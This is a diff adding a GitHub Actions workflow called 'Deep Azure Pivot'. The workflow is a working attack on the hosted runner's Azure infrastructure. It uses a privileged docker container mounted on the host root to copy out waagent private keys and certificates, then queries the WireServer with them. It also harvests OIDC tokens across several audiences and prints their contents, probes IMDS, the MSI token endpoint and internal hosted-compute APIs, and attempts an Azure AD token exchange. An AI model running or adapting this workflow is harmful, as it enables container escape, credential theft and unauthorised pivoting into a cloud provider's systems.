@@ -1,0 +1,122 @@
+name: Deep Azure Pivot
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  deep-pivot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: WireServer via host network + cert extraction
+        run: |
+          # Copy certs out via docker privileged
+          docker run --rm --privileged -v /:/host alpine:latest sh -c '
+            cp /host/var/lib/waagent/TransportCert.pem /host/tmp/tc.pem
+            cp /host/var/lib/waagent/TransportPrivate.pem /host/tmp/tp.pem
+            chmod 644 /host/tmp/tc.pem /host/tmp/tp.pem
+            echo "CERT_COPIED"
+            # Also grab full waagent dir listing
+            ls -la /host/var/lib/waagent/
+            # Try to read more waagent files
+            cat /host/var/lib/waagent/Certificates.pem 2>/dev/null | head -30 || echo NO_CERTIFICATES
+            # OVF env
+            cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo NO_OVF
+          '
+          echo "=== WireServer via host network ==="
+          curl -sv --max-time 10 \
+            --cert /tmp/tc.pem --key /tmp/tp.pem \
+            --resolve "168.63.129.16:80:168.63.129.16" \
+            "http://168.63.129.16/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" 2>&1 | head -80 || echo WS_GOALSTATE_FAILED
+          echo "=== WireServer port 32526 ==="
+          curl -sv --max-time 10 \
+            --cert /tmp/tc.pem --key /tmp/tp.pem \
+            "http://168.63.129.16:32526/vmSettings" 2>&1 | head -80 || echo WS_32526_FAILED
+          echo "=== WireServer tenantInfo ==="
+          curl -sv --max-time 10 \
+            --cert /tmp/tc.pem --key /tmp/tp.pem \
+            "http://168.63.129.16/machine/?comp=tenantInfo" \
+            -H "x-ms-version: 2012-11-30" 2>&1 | head -80 || echo WS_TENANT_FAILED
+
+      - name: HC OIDC deep probe with status codes
+        run: |
+          HC_TOKEN=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "HC_TOKEN_LEN=${#HC_TOKEN}"
+
+          # Decode JWT payload (base64 middle segment)
+          PAYLOAD=$(echo "$HC_TOKEN" | cut -d. -f2 | tr '_-' '/+' | \
+            python3 -c "import sys,base64; d=sys.stdin.read().strip(); d+='='*(-len(d)%4); print(base64.b64decode(d).decode('utf-8','replace'))" 2>/dev/null)
+          echo "=HC_JWT_PAYLOAD="
+          echo "$PAYLOAD"
+
+          IMDS=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          BASE_RO=$(echo "$IMDS" | python3 -c "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.base_ro_url',''))")
+          ALLOC=$(echo "$IMDS" | python3 -c "import sys,json; tags={t['name']:t['value'] for t in json.load(sys.stdin)['compute']['tagsList']}; print(tags.get('hosted_compute.allocation_id',''))")
+          VMID=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])")
+          SUBID=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])")
+          echo "BASE_RO=$BASE_RO ALLOC=$ALLOC VMID=$VMID SUBID=$SUBID"
+
+          if [ -n "$HC_TOKEN" ] && [ -n "$BASE_RO" ]; then
+            echo "=HC_BASE_PROBE="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO" 2>&1 | grep -E "(HTTP|<|{)" | head -30
+            echo "=HC_ALLOC_VERBOSE="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/allocations/$ALLOC" 2>&1 | head -60
+            echo "=HC_VM_VERBOSE="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/vms/$VMID" 2>&1 | head -60
+            echo "=HC_ALLOCS_LIST="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/allocations" 2>&1 | head -60
+            echo "=HC_VMS_LIST="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/vms" 2>&1 | head -60
+            echo "=HC_SUBSCRIPTION="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO/subscriptions/$SUBID" 2>&1 | head -60
+            echo "=HC_HEALTH="
+            curl -sv --max-time 10 -H "Authorization: Bearer $HC_TOKEN" "${BASE_RO%/vm/v1}/_health" 2>&1 | head -40
+            echo "=HC_STATUS_CODES_SUMMARY="
+            for path in "" "/allocations/$ALLOC" "/vms/$VMID" "/allocations" "/vms" "/subscriptions/$SUBID" "/pools" "/images"; do
+              CODE=$(curl -o /dev/null -sw "%{http_code}" --max-time 8 \
+                -H "Authorization: Bearer $HC_TOKEN" "$BASE_RO$path" 2>/dev/null)
+              echo "  $BASE_RO$path => HTTP $CODE"
+            done
+          fi
+
+      - name: Try HC with azure-actions audience + MSI endpoints
+        run: |
+          # Try different OIDC audiences
+          for AUD in "api://hosted-compute-ro" "api://hosted-compute" "api://AzureADTokenExchange" "api://github-actions-runner" "https://management.azure.com/"; do
+            TOK=$(curl -sf \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$AUD" | \
+              python3 -c "import sys,json; d=json.load(sys.stdin); print(f'len={len(d.get(\"value\",\"\"))} val={d.get(\"value\",\"\")[:50]}')" 2>/dev/null)
+            echo "AUD=$AUD => $TOK"
+          done
+
+          # Try Azure MSI endpoint from runner (IMDS identity)
+          echo "=MSI_IDENTITY="
+          curl -sf --max-time 5 \
+            -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            2>&1 | head -20 || echo MSI_FAILED
+
+          # Try GitHub OIDC → Azure AD federation via ARM
+          GH_TOKEN=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          if [ -n "$GH_TOKEN" ]; then
+            echo "=ARM_TOKEN_EXCHANGE="
+            curl -s --max-time 10 \
+              -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth2:grant-type:jwt-bearer" \
+              -d "client_assertion_type=urn:ietf:params:oauth2:client-assertion-type:jwt-bearer" \
+              -d "client_assertion=$GH_TOKEN" \
+              -d "scope=https://management.azure.com/.default" \
+              -d "requested_token_use=on_behalf_of" | head -100 || echo ARM_EXCHANGE_FAILED
+          fi
